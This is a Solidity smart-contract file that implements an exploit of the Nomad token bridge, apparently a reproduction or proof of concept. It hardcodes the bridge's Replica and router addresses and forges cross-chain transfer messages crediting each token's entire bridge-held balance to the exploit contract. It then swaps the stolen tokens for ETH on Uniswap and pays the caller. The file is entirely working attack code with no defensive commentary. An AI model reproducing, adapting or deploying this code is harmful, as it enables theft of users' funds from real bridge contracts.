// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "./NomadBridge/Interfaces.sol";
import "./NomadBridge/TypedMemView.sol";
import "./NomadBridge/Message.sol";
import "./NomadBridge/BridgeMessage.sol";
import "v2-periphery/interfaces/IUniswapV2Router02.sol";

contract NomadBridgeExploit {
    using TypedMemView for bytes;
    using TypedMemView for bytes29;
    using BridgeMessage for bytes29;
    using Message for bytes29;

    address constant replicaAddress = 0x5D94309E5a0090b165FA4181519701637B6DAEBA;
    address constant proxyAddress = 0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3; // BridgeRouter
    address constant prevBridgeRouterAddress = 0xD3dfD3eDe74E0DCEBC1AA685e151332857efCe2d;

    IUniswapV2Router02 constant uniswapRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address constant wethAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function exploit(address[] calldata tokens) public {
        IReplica replica = IReplica(replicaAddress);
        IBridgeRouter bridgeRouter = IBridgeRouter(proxyAddress);
        ITokenRegistry tokenRegistry = bridgeRouter.tokenRegistry();

        for (uint256 i = 0; i < tokens.length; i++) {
            address tokenAddress = tokens[i];
            ERC20 token = ERC20(tokenAddress);

            (uint32 domain, bytes32 id) = tokenRegistry.getTokenId(tokenAddress);
            // Note: domain = destinationDomain

            bytes29 action = BridgeMessage.formatTransfer(
                bytes32(uint256(uint160(address(this)))),
                token.balanceOf(proxyAddress),
                BridgeMessage.getDetailsHash(token.name(), token.symbol(), token.decimals())
            );
            bytes29 tokenId = BridgeMessage.formatTokenId(domain, id);
            bytes memory rawBridgeMessage = BridgeMessage.formatMessage(tokenId, action);

            bytes memory rawMessage = Message.formatMessage(
                1650811245, // originDomain
                bytes32(uint256(uint160(prevBridgeRouterAddress))), // sender
                0, // nonce
                6648936, // destinationDomain
                bytes32(uint256(uint160(proxyAddress))), // recipient
                rawBridgeMessage
            );

            replica.process(rawMessage);

            token.approve(address(uniswapRouter), type(uint256).max);
            address[] memory path = new address[](2);
            path[0] = tokenAddress;
            path[1] = wethAddress;
            uniswapRouter.swapExactTokensForETH(token.balanceOf(address(this)), 0, path, msg.sender, type(uint256).max);
        }
    }
}
